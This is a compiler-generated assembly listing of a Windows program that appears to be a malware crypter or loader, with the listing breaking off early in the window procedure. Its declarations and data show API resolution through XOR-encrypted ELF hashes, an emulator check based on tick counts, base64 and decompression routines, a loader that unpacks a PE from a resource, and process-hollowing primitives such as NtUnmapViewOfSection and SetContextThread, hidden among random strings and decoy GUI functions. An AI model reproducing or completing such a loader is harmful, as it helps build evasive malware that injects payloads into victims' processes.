; Listing generated by Microsoft (R) Optimizing Compiler Version 18.00.40629.0 

	TITLE	C:\Users\Admin\documents\visual studio 2013\Projects\Win32Project1\Win32Project1\Win32Project1.cpp
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	?x_FindResourceW@@3P6GPAUHRSRC__@@PAUHINSTANCE__@@PA_W1@ZA ; x_FindResourceW
PUBLIC	?x_SizeofResource@@3P6GKPAUHINSTANCE__@@PAUHRSRC__@@@ZA ; x_SizeofResource
PUBLIC	?x_LoadResource@@3P6GPAXPAUHINSTANCE__@@PAUHRSRC__@@@ZA ; x_LoadResource
PUBLIC	?x_LockResource@@3P6GPAXPAX@ZA			; x_LockResource
PUBLIC	?x_VirtualAlloc@@3P6GPAXPAXKKK@ZA		; x_VirtualAlloc
PUBLIC	?x_CreateProcessW@@3P6GHPA_W0PAU_SECURITY_ATTRIBUTES@@1HKPAXPBDPAU_STARTUPINFOW@@PAU_PROCESS_INFORMATION@@@ZA ; x_CreateProcessW
PUBLIC	?x_NtAllocateVirtualMemory@@3P6GJPAXPAPAXKPAKKK@ZA ; x_NtAllocateVirtualMemory
PUBLIC	?x_NtFreeVirtualMemory@@3P6GJPAXPAPAXPAKK@ZA	; x_NtFreeVirtualMemory
PUBLIC	?x_NtWriteVirtualMemory@@3P6GJPAX00KPAK@ZA	; x_NtWriteVirtualMemory
PUBLIC	?x_NtReadVirtualMemory@@3P6GJPAX00KPAK@ZA	; x_NtReadVirtualMemory
PUBLIC	?x_NtQueryVirtualMemory@@3P6GJPAX0W4_MEMORY_INFORMATION_CLASS@API_DEFINES@@0KPAK@ZA ; x_NtQueryVirtualMemory
PUBLIC	?x_NtProtectVirtualMemory@@3P6GJPAXPAPAXPAKK2@ZA ; x_NtProtectVirtualMemory
PUBLIC	?x_NtGetContextThread@@3P6GJPAXPAU_CONTEXT@@@ZA	; x_NtGetContextThread
PUBLIC	?x_NtSetContextThread@@3P6GJPAXPAU_CONTEXT@@@ZA	; x_NtSetContextThread
PUBLIC	?x_NtQueueApcThread@@3P6GJPAXP6GX0PAU_IO_STATUS_BLOCK@API_DEFINES@@K@Z01K@ZA ; x_NtQueueApcThread
PUBLIC	?x_NtAlertResumeThread@@3P6GJPAXPAK@ZA		; x_NtAlertResumeThread
PUBLIC	?x_NtUnmapViewOfSection@@3P6GJPAX0@ZA		; x_NtUnmapViewOfSection
PUBLIC	?x_NtDelayExecution@@3P6GJEPAT_LARGE_INTEGER@@@ZA ; x_NtDelayExecution
PUBLIC	?x_RtlGetCompressionWorkSpaceSize@@3P6GJKPAK0@ZA ; x_RtlGetCompressionWorkSpaceSize
PUBLIC	?x_RtlDecompressBuffer@@3P6GJKPAXK0KPAK@ZA	; x_RtlDecompressBuffer
PUBLIC	?x_NtResumeThread@@3P6GJPAXPAK@ZA		; x_NtResumeThread
PUBLIC	?KERNEL32_BASE_ADDRESS@@3PAXA			; KERNEL32_BASE_ADDRESS
PUBLIC	?NTDLL_BASE_ADDRESS@@3PAXA			; NTDLL_BASE_ADDRESS
PUBLIC	?pSettings@@3PAUSettings@@A			; pSettings
PUBLIC	?hInst@@3PAUHINSTANCE__@@A			; hInst
PUBLIC	?szTitle@@3PADA					; szTitle
PUBLIC	?szWindowClass@@3PADA				; szWindowClass
PUBLIC	?lpKey@@3RCDC					; lpKey
PUBLIC	?lpSettings@@3RCEC				; lpSettings
PUBLIC	?maskOffsetBegin@@3KC				; maskOffsetBegin
PUBLIC	?hash_FindResourceW@@3KC			; hash_FindResourceW
PUBLIC	?hash_SizeofResource@@3KC			; hash_SizeofResource
PUBLIC	?hash_LoadResource@@3KC				; hash_LoadResource
PUBLIC	?hash_LockResource@@3KC				; hash_LockResource
PUBLIC	?hash_VirtualAlloc@@3KC				; hash_VirtualAlloc
PUBLIC	?hash_CreateProcessW@@3KC			; hash_CreateProcessW
PUBLIC	?hash_NtAllocateVirtualMemory@@3KC		; hash_NtAllocateVirtualMemory
PUBLIC	?hash_NtFreeVirtualMemory@@3KC			; hash_NtFreeVirtualMemory
PUBLIC	?hash_NtWriteVirtualMemory@@3KC			; hash_NtWriteVirtualMemory
PUBLIC	?hash_NtReadVirtualMemory@@3KC			; hash_NtReadVirtualMemory
PUBLIC	?hash_NtQueryVirtualMemory@@3KC			; hash_NtQueryVirtualMemory
PUBLIC	?hash_NtProtectVirtualMemory@@3KC		; hash_NtProtectVirtualMemory
PUBLIC	?hash_NtGetContextThread@@3KC			; hash_NtGetContextThread
PUBLIC	?hash_NtSetContextThread@@3KC			; hash_NtSetContextThread
PUBLIC	?hash_NtQueueApcThread@@3KC			; hash_NtQueueApcThread
PUBLIC	?hash_NtAlertResumeThread@@3KC			; hash_NtAlertResumeThread
PUBLIC	?hash_NtUnmapViewOfSection@@3KC			; hash_NtUnmapViewOfSection
PUBLIC	?hash_iswalpha@@3KC				; hash_iswalpha
PUBLIC	?hash_ExitProcess@@3KC				; hash_ExitProcess
PUBLIC	?hash_GetTickCount@@3KC				; hash_GetTickCount
PUBLIC	?hash_NtDelayExecution@@3KC			; hash_NtDelayExecution
PUBLIC	?hash_NtRegisterThreadTerminatePort@@3KC	; hash_NtRegisterThreadTerminatePort
PUBLIC	?hash_RtlGetCompressionWorkSpaceSize@@3KC	; hash_RtlGetCompressionWorkSpaceSize
PUBLIC	?hash_RtlDecompressBuffer@@3KC			; hash_RtlDecompressBuffer
PUBLIC	?hash_NtResumeThread@@3KC			; hash_NtResumeThread
PUBLIC	?maskOffsetEnd@@3KC				; maskOffsetEnd
_BSS	SEGMENT
?x_FindResourceW@@3P6GPAUHRSRC__@@PAUHINSTANCE__@@PA_W1@ZA DD 01H DUP (?) ; x_FindResourceW
?x_SizeofResource@@3P6GKPAUHINSTANCE__@@PAUHRSRC__@@@ZA DD 01H DUP (?) ; x_SizeofResource
?x_LoadResource@@3P6GPAXPAUHINSTANCE__@@PAUHRSRC__@@@ZA DD 01H DUP (?) ; x_LoadResource
?x_LockResource@@3P6GPAXPAX@ZA DD 01H DUP (?)		; x_LockResource
?x_VirtualAlloc@@3P6GPAXPAXKKK@ZA DD 01H DUP (?)	; x_VirtualAlloc
?x_CreateProcessW@@3P6GHPA_W0PAU_SECURITY_ATTRIBUTES@@1HKPAXPBDPAU_STARTUPINFOW@@PAU_PROCESS_INFORMATION@@@ZA DD 01H DUP (?) ; x_CreateProcessW
?x_NtAllocateVirtualMemory@@3P6GJPAXPAPAXKPAKKK@ZA DD 01H DUP (?) ; x_NtAllocateVirtualMemory
?x_NtFreeVirtualMemory@@3P6GJPAXPAPAXPAKK@ZA DD 01H DUP (?) ; x_NtFreeVirtualMemory
?x_NtWriteVirtualMemory@@3P6GJPAX00KPAK@ZA DD 01H DUP (?) ; x_NtWriteVirtualMemory
?x_NtReadVirtualMemory@@3P6GJPAX00KPAK@ZA DD 01H DUP (?) ; x_NtReadVirtualMemory
?x_NtQueryVirtualMemory@@3P6GJPAX0W4_MEMORY_INFORMATION_CLASS@API_DEFINES@@0KPAK@ZA DD 01H DUP (?) ; x_NtQueryVirtualMemory
?x_NtProtectVirtualMemory@@3P6GJPAXPAPAXPAKK2@ZA DD 01H DUP (?) ; x_NtProtectVirtualMemory
?x_NtGetContextThread@@3P6GJPAXPAU_CONTEXT@@@ZA DD 01H DUP (?) ; x_NtGetContextThread
?x_NtSetContextThread@@3P6GJPAXPAU_CONTEXT@@@ZA DD 01H DUP (?) ; x_NtSetContextThread
?x_NtQueueApcThread@@3P6GJPAXP6GX0PAU_IO_STATUS_BLOCK@API_DEFINES@@K@Z01K@ZA DD 01H DUP (?) ; x_NtQueueApcThread
?x_NtAlertResumeThread@@3P6GJPAXPAK@ZA DD 01H DUP (?)	; x_NtAlertResumeThread
?x_NtUnmapViewOfSection@@3P6GJPAX0@ZA DD 01H DUP (?)	; x_NtUnmapViewOfSection
?x_NtDelayExecution@@3P6GJEPAT_LARGE_INTEGER@@@ZA DD 01H DUP (?) ; x_NtDelayExecution
?x_RtlGetCompressionWorkSpaceSize@@3P6GJKPAK0@ZA DD 01H DUP (?) ; x_RtlGetCompressionWorkSpaceSize
?x_RtlDecompressBuffer@@3P6GJKPAXK0KPAK@ZA DD 01H DUP (?) ; x_RtlDecompressBuffer
?x_NtResumeThread@@3P6GJPAXPAK@ZA DD 01H DUP (?)	; x_NtResumeThread
?KERNEL32_BASE_ADDRESS@@3PAXA DD 01H DUP (?)		; KERNEL32_BASE_ADDRESS
?NTDLL_BASE_ADDRESS@@3PAXA DD 01H DUP (?)		; NTDLL_BASE_ADDRESS
?pSettings@@3PAUSettings@@A DD 01H DUP (?)		; pSettings
?hInst@@3PAUHINSTANCE__@@A DD 01H DUP (?)		; hInst
?szTitle@@3PADA DB 064H DUP (?)				; szTitle
?szWindowClass@@3PADA DB 064H DUP (?)			; szWindowClass
_BSS	ENDS
data	SEGMENT
?lpKey@@3RCDC DB 04eH					; lpKey
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
	DB	04eH
	DB	0a7H
	DB	0c9H
	DB	0eeH
	DB	0cbH
	DB	043H
	DB	06cH
	DB	053H
	DB	0f6H
	DB	02aH
	DB	0ceH
	DB	037H
	DB	01eH
	DB	068H
	DB	0c2H
	DB	072H
?lpSettings@@3RCEC DB 00H				; lpSettings
	DB	00H
	DB	00H
	DB	00H
?maskOffsetBegin@@3KC DD 0deaddeadH			; maskOffsetBegin
?hash_FindResourceW@@3KC DD 05681127H			; hash_FindResourceW
?hash_SizeofResource@@3KC DD 0daa96b5H			; hash_SizeofResource
?hash_LoadResource@@3KC DD 09b3b115H			; hash_LoadResource
?hash_LockResource@@3KC DD 09b36815H			; hash_LockResource
?hash_VirtualAlloc@@3KC DD 03d8cae3H			; hash_VirtualAlloc
?hash_CreateProcessW@@3KC DD 01e16457H			; hash_CreateProcessW
?hash_NtAllocateVirtualMemory@@3KC DD 013f9f79H		; hash_NtAllocateVirtualMemory
?hash_NtFreeVirtualMemory@@3KC DD 0bc01609H		; hash_NtFreeVirtualMemory
?hash_NtWriteVirtualMemory@@3KC DD 07dc9209H		; hash_NtWriteVirtualMemory
?hash_NtReadVirtualMemory@@3KC DD 0bab4a59H		; hash_NtReadVirtualMemory
?hash_NtQueryVirtualMemory@@3KC DD 07ba5149H		; hash_NtQueryVirtualMemory
?hash_NtProtectVirtualMemory@@3KC DD 075e7e39H		; hash_NtProtectVirtualMemory
?hash_NtGetContextThread@@3KC DD 04b2fb04H		; hash_NtGetContextThread
?hash_NtSetContextThread@@3KC DD 04b3bb04H		; hash_NtSetContextThread
?hash_NtQueueApcThread@@3KC DD 03614a94H		; hash_NtQueueApcThread
?hash_NtAlertResumeThread@@3KC DD 06ab0384H		; hash_NtAlertResumeThread
?hash_NtUnmapViewOfSection@@3KC DD 0c8338eeH		; hash_NtUnmapViewOfSection
?hash_iswalpha@@3KC DD 0ad831e1H			; hash_iswalpha
?hash_ExitProcess@@3KC DD 07d96c33H			; hash_ExitProcess
?hash_GetTickCount@@3KC DD 0d26f2a4H			; hash_GetTickCount
?hash_NtDelayExecution@@3KC DD 07812c1eH		; hash_NtDelayExecution
?hash_NtRegisterThreadTerminatePort@@3KC DD 06daeb84H	; hash_NtRegisterThreadTerminatePort
?hash_RtlGetCompressionWorkSpaceSize@@3KC DD 0a455b15H	; hash_RtlGetCompressionWorkSpaceSize
?hash_RtlDecompressBuffer@@3KC DD 0a6cebb2H		; hash_RtlDecompressBuffer
?hash_NtResumeThread@@3KC DD 03232414H			; hash_NtResumeThread
?maskOffsetEnd@@3KC DD 0deadc0deH			; maskOffsetEnd
data	ENDS
CONST	SEGMENT
$SG53254 DB	'YABlX8SUL', 00H
	ORG $+2
$SG53264 DB	'OYMonvF', 00H
$SG53277 DB	'i', 00H, 'T', 00H, 'g', 00H, 'P', 00H, 'L', 00H, 00H, 00H
$SG53281 DB	'S', 00H, 'q', 00H, 'a', 00H, 'b', 00H, 'N', 00H, 'C', 00H
	DB	'N', 00H, '0', 00H, 'U', 00H, 'I', 00H, 00H, 00H
	ORG $+2
$SG53282 DB	'O', 00H, '4', 00H, '9', 00H, 't', 00H, '0', 00H, 'k', 00H
	DB	'D', 00H, 'N', 00H, 'J', 00H, 'm', 00H, 00H, 00H
	ORG $+2
$SG53283 DB	's0k3uvxTc', 00H
	ORG $+2
$SG53296 DB	'r', 00H, 'D', 00H, '2', 00H, 'J', 00H, 00H, 00H
	ORG $+2
$SG53304 DB	'r', 00H, 'Q', 00H, '8', 00H, 'L', 00H, 'i', 00H, '0', 00H
	DB	'A', 00H, 'l', 00H, '8', 00H, 'n', 00H, 't', 00H, 00H, 00H
$SG53335 DB	'I', 00H, 'x', 00H, 'W', 00H, 'm', 00H, 'B', 00H, '4', 00H
	DB	'X', 00H, 'C', 00H, 'l', 00H, 00H, 00H
$SG53356 DB	'f', 00H, 'I', 00H, 'j', 00H, 'v', 00H, 00H, 00H
	ORG $+2
$SG53367 DB	'5gHXx', 00H
	ORG $+2
$SG53370 DB	'0', 00H, 'H', 00H, 't', 00H, 'C', 00H, 'H', 00H, '9', 00H
	DB	'E', 00H, 'i', 00H, 00H, 00H
	ORG $+2
$SG53372 DB	'uynAE2I8o', 00H
	ORG $+2
$SG53376 DB	'xRmoMUa', 00H
$SG53377 DB	'Q1D2', 00H
	ORG $+3
$SG53385 DB	'W0Vh58Z4xe', 00H
	ORG $+1
$SG53410 DB	'Br6mGD9ZZ9', 00H
	ORG $+1
$SG31906 DB	'|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XY'
	DB	'Z[\]^_`abcdefghijklmnopq', 00H
	ORG $+3
$SG53423 DB	'b5iwLJw', 00H
$SG53424 DB	'G', 00H, 'O', 00H, 'q', 00H, 'Y', 00H, 'P', 00H, 'T', 00H
	DB	'O', 00H, 00H, 00H
$SG53426 DB	'w', 00H, 'V', 00H, 'N', 00H, 'y', 00H, 's', 00H, 'C', 00H
	DB	'B', 00H, 'X', 00H, 00H, 00H
	ORG $+2
$SG53444 DB	'4DyZgllRUo', 00H
	ORG $+1
$SG53453 DB	'TRikUXSj', 00H
	ORG $+3
$SG53454 DB	'EqC1g3dX3N', 00H
	ORG $+1
$SG53455 DB	'n', 00H, 'F', 00H, 'V', 00H, 'W', 00H, 'R', 00H, 'e', 00H
	DB	'B', 00H, 'B', 00H, '2', 00H, '3', 00H, 'J', 00H, 00H, 00H
$SG53456 DB	'I', 00H, 'c', 00H, 'i', 00H, 'n', 00H, 'K', 00H, 00H, 00H
$SG53475 DB	'Mx1E', 00H
	ORG $+3
$SG53523 DB	'c', 00H, 'p', 00H, 'Y', 00H, 'H', 00H, '0', 00H, 00H, 00H
$SG53530 DB	'WcJRNeG1Mf', 00H
	ORG $+1
$SG53568 DB	'4', 00H, 'Z', 00H, 'K', 00H, 'A', 00H, 'p', 00H, 'V', 00H
	DB	'F', 00H, 'P', 00H, 't', 00H, 'H', 00H, 'z', 00H, 00H, 00H
$SG53210 DB	'nQPqZD', 00H
	ORG $+1
$SG53224 DB	'7', 00H, 'P', 00H, '1', 00H, 'q', 00H, 'I', 00H, 'p', 00H
	DB	'W', 00H, 'R', 00H, 'q', 00H, '6', 00H, 00H, 00H
	ORG $+2
$SG53227 DB	'w', 00H, 'D', 00H, 'U', 00H, 'w', 00H, 00H, 00H
CONST	ENDS
PUBLIC	_memset
PUBLIC	_WinMain@16
PUBLIC	?load_kernel32@@YA_NXZ				; load_kernel32
PUBLIC	?load_ntdll@@YA_NXZ				; load_ntdll
PUBLIC	?ELFHash@@YAIPADI@Z				; ELFHash
PUBLIC	?m_memcpy@@YAPAXPAXPBXH@Z			; m_memcpy
PUBLIC	?m_strlen@@YAIPBD@Z				; m_strlen
PUBLIC	?m_strcmp@@YAHPBD0@Z				; m_strcmp
PUBLIC	?init_settings@@YAXXZ				; init_settings
PUBLIC	?decrypt_hashes@@YAXXZ				; decrypt_hashes
PUBLIC	?load_func@@YAPAXW4MODULE_BASE@@K@Z		; load_func
PUBLIC	?base64Decode@@YAPAEPADKPAK@Z			; base64Decode
PUBLIC	?xor_encrypt_decrypt@@YAXPADK@Z			; xor_encrypt_decrypt
PUBLIC	?DecompressData@@YAPAXPAXKPAK@Z			; DecompressData
PUBLIC	?InternalGetTickCount@@YAKXZ			; InternalGetTickCount
PUBLIC	?InternalGetTickCount_WINAPI@@YAKXZ		; InternalGetTickCount_WINAPI
PUBLIC	?checkEmulator_GetTickCount@@YA_NXZ		; checkEmulator_GetTickCount
PUBLIC	?loader_init@@YA_NXZ				; loader_init
PUBLIC	?loader_load_res@@YAPAXPAK@Z			; loader_load_res
PUBLIC	?GetSectionProtection@@YAKK@Z			; GetSectionProtection
PUBLIC	?loader_load_pe@@YAXPAXK@Z			; loader_load_pe
PUBLIC	?func_0_0@@YAPAUHDC__@@PAJPAUHMENU__@@@Z	; func_0_0
PUBLIC	?func_0_1@@YAPAXPAUHINSTANCE__@@PA_WPAUHMENU__@@0PAUHWND__@@2@Z ; func_0_1
PUBLIC	?func_0_2@@YAPAUHDC__@@XZ			; func_0_2
PUBLIC	?func_0_3@@YAPAUHDC__@@XZ			; func_0_3
PUBLIC	?func_1_0@@YAPAUHMENU__@@PAJPAU1@JPADHPAUHINSTANCE__@@PAK@Z ; func_1_0
PUBLIC	?func_1_1@@YAPAUHMENU__@@PAUHDC__@@J@Z		; func_1_1
PUBLIC	?func_2_0@@YAKKJPAX@Z				; func_2_0
PUBLIC	?func_2_1@@YAPAXKPAUHINSTANCE__@@PA_WPADPAUHDC__@@3@Z ; func_2_1
PUBLIC	?func_2_2@@YAPAXPAKPA_W@Z			; func_2_2
PUBLIC	?func_2_3@@YAXXZ				; func_2_3
PUBLIC	?MyRegisterClass@@YAGPAUHINSTANCE__@@@Z		; MyRegisterClass
PUBLIC	?InitInstance@@YAHPAUHINSTANCE__@@H@Z		; InitInstance
PUBLIC	?WndProc@@YGJPAUHWND__@@IIJ@Z			; WndProc
PUBLIC	?About@@YGHPAUHWND__@@IIJ@Z			; About
EXTRN	__imp__FreeLibrary@4:PROC
EXTRN	__imp__GlobalLock@4:PROC
EXTRN	__imp__GlobalUnlock@4:PROC
EXTRN	__imp__LocalAlloc@8:PROC
EXTRN	__imp__LocalFree@4:PROC
EXTRN	__imp__VirtualAlloc@16:PROC
EXTRN	__imp__VirtualFree@12:PROC
EXTRN	__imp__HeapAlloc@12:PROC
EXTRN	__imp__HeapReAlloc@16:PROC
EXTRN	__imp__HeapFree@12:PROC
EXTRN	__imp__GetProcessHeap@0:PROC
EXTRN	__imp__GetCurrentProcessId@0:PROC
EXTRN	__imp__UnhandledExceptionFilter@4:PROC
EXTRN	__imp__SetUnhandledExceptionFilter@4:PROC
EXTRN	__imp__GetLastError@0:PROC
EXTRN	__imp__InitializeCriticalSection@4:PROC
EXTRN	__imp__EnterCriticalSection@4:PROC
EXTRN	__imp__LeaveCriticalSection@4:PROC
EXTRN	__imp__DeleteCriticalSection@4:PROC
EXTRN	__imp__ReleaseMutex@4:PROC
EXTRN	__imp__WaitForSingleObject@8:PROC
EXTRN	__imp__GetFileSize@8:PROC
EXTRN	__imp__GetSystemTimeAsFileTime@4:PROC
EXTRN	__imp__FormatMessageW@28:PROC
EXTRN	__imp__lstrcmpA@8:PROC
EXTRN	__imp__lstrcmpW@8:PROC
EXTRN	__imp__lstrcpyW@8:PROC
EXTRN	__imp__lstrcatA@8:PROC
EXTRN	__imp__lstrcatW@8:PROC
EXTRN	__imp__lstrlenA@4:PROC
EXTRN	__imp__lstrlenW@4:PROC
EXTRN	__imp__GetCommandLineW@0:PROC
EXTRN	__imp__wsprintfA:PROC
EXTRN	__imp__GetMessageA@16:PROC
EXTRN	__imp__TranslateMessage@4:PROC
EXTRN	__imp__ExitWindowsEx@8:PROC
EXTRN	__imp__DefWindowProcA@16:PROC
EXTRN	__imp__RegisterClassExA@4:PROC
EXTRN	__imp__CreateWindowExA@48:PROC
EXTRN	__imp__IsWindow@4:PROC
EXTRN	__imp__DestroyWindow@4:PROC
EXTRN	__imp__ShowWindow@8:PROC
EXTRN	__imp__GetWindowPlacement@8:PROC
EXTRN	__imp__IsWindowVisible@4:PROC
EXTRN	__imp__DialogBoxParamA@20:PROC
EXTRN	__imp__EndDialog@8:PROC
EXTRN	__imp__GetDlgItem@8:PROC
EXTRN	__imp__IsDlgButtonChecked@8:PROC
EXTRN	__imp__SetFocus@4:PROC
EXTRN	__imp__GetKeyState@4:PROC
EXTRN	__imp__LoadAcceleratorsA@8:PROC
EXTRN	__imp__TranslateAcceleratorA@12:PROC
EXTRN	__imp__LoadMenuW@8:PROC
EXTRN	__imp__GetMenu@4:PROC
EXTRN	__imp__GetMenuState@12:PROC
EXTRN	__imp__DrawMenuBar@4:PROC
EXTRN	__imp__GetSystemMenu@8:PROC
EXTRN	__imp__CreateMenu@0:PROC
EXTRN	__imp__DestroyMenu@4:PROC
EXTRN	__imp__CheckMenuItem@12:PROC
EXTRN	__imp__GetSubMenu@8:PROC
EXTRN	__imp__RemoveMenu@12:PROC
EXTRN	__imp__DeleteMenu@12:PROC
EXTRN	__imp__SetMenuDefaultItem@12:PROC
EXTRN	__imp__UpdateWindow@4:PROC
EXTRN	__imp__SetForegroundWindow@4:PROC
EXTRN	__imp__ReleaseDC@8:PROC
EXTRN	__imp__BeginPaint@8:PROC
EXTRN	__imp__EndPaint@8:PROC
EXTRN	__imp__GetPropA@8:PROC
EXTRN	__imp__GetPropW@8:PROC
EXTRN	__imp__SetWindowTextA@8:PROC
EXTRN	__imp__SetWindowTextW@8:PROC
EXTRN	__imp__GetWindowRect@8:PROC
EXTRN	__imp__GetCursor@0:PROC
EXTRN	__imp__GetSysColor@4:PROC
EXTRN	__imp__GetWindowLongA@8:PROC
EXTRN	__imp__GetShellWindow@0:PROC
EXTRN	__imp__GetClassNameA@12:PROC
EXTRN	__imp__GetLastActivePopup@4:PROC
EXTRN	__imp__LoadCursorA@8:PROC
EXTRN	__imp__LoadIconA@8:PROC
EXTRN	__imp__LoadStringA@16:PROC
EXTRN	__imp__GetACP@0:PROC
EXTRN	__imp__MultiByteToWideChar@24:PROC
EXTRN	__imp__WideCharToMultiByte@32:PROC
EXTRN	__imp__GetSystemDefaultLangID@0:PROC
EXTRN	__imp__CreatePropertySheetPageA@4:PROC
EXTRN	__imp__PropertySheetA@4:PROC
EXTRN	__imp__InitCommonControls@0:PROC
EXTRN	__imp__ImageList_Create@20:PROC
EXTRN	__imp__ImageList_ReplaceIcon@12:PROC
EXTRN	__imp__ImageList_LoadImageA@28:PROC
EXTRN	__imp__ImageList_GetIconSize@12:PROC
EXTRN	__imp__OleInitialize@4:PROC
EXTRN	__aullshr:PROC
EXTRN	_memset:PROC
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
tv64 = -4						; size = 4
_hDlg$ = 8						; size = 4
_message$ = 12						; size = 4
_wParam$ = 16						; size = 4
_lParam$ = 20						; size = 4
?About@@YGHPAUHWND__@@IIJ@Z PROC			; About

; 704  : INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {

	push	ebp
	mov	ebp, esp
	push	ecx

; 705  : 	UNREFERENCED_PARAMETER(lParam);
; 706  : 	switch (message) {

	mov	eax, DWORD PTR _message$[ebp]
	mov	DWORD PTR tv64[ebp], eax
	cmp	DWORD PTR tv64[ebp], 272		; 00000110H
	je	SHORT $LN4@About
	cmp	DWORD PTR tv64[ebp], 273		; 00000111H
	je	SHORT $LN3@About
	jmp	SHORT $LN5@About
$LN4@About:

; 707  : 		case WM_INITDIALOG:
; 708  : 			return (INT_PTR)TRUE;

	mov	eax, 1
	jmp	SHORT $LN7@About
$LN3@About:

; 709  : 
; 710  : 		case WM_COMMAND:
; 711  : 			if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) {

	mov	ecx, DWORD PTR _wParam$[ebp]
	and	ecx, 65535				; 0000ffffH
	movzx	edx, cx
	cmp	edx, 1
	je	SHORT $LN1@About
	mov	eax, DWORD PTR _wParam$[ebp]
	and	eax, 65535				; 0000ffffH
	movzx	ecx, ax
	cmp	ecx, 2
	jne	SHORT $LN5@About
$LN1@About:

; 712  : 				EndDialog(hDlg, LOWORD(wParam));

	mov	edx, DWORD PTR _wParam$[ebp]
	and	edx, 65535				; 0000ffffH
	movzx	eax, dx
	push	eax
	mov	ecx, DWORD PTR _hDlg$[ebp]
	push	ecx
	call	DWORD PTR __imp__EndDialog@8

; 713  : 				return (INT_PTR)TRUE;

	mov	eax, 1
	jmp	SHORT $LN7@About
$LN5@About:

; 714  : 			}
; 715  : 			break;
; 716  : 	}
; 717  : 	return (INT_PTR)FALSE;

	xor	eax, eax
$LN7@About:

; 718  : }

	mov	esp, ebp
	pop	ebp
	ret	16					; 00000010H
?About@@YGHPAUHWND__@@IIJ@Z ENDP			; About
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_ps$ = -84						; size = 64
_hdc$ = -20						; size = 4
_wmEvent$ = -16						; size = 4
_wmId$ = -12						; size = 4
tv72 = -8						; size = 4
tv64 = -4						; size = 4
_hWnd$ = 8						; size = 4
_message$ = 12						; size = 4
_wParam$ = 16						; size = 4
_lParam$ = 20						; size = 4
?WndProc@@YGJPAUHWND__@@IIJ@Z PROC			; WndProc

; 668  : LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {

	push	ebp
	mov	ebp, esp
	sub	esp, 84					; 00000054H

; 669  : 	int wmId, wmEvent;
; 670  : 	PAINTSTRUCT ps;
; 671  : 	HDC hdc;
; 672  : 
; 673  : 	switch (message) {

	mov	eax, DWORD PTR _message$[ebp]
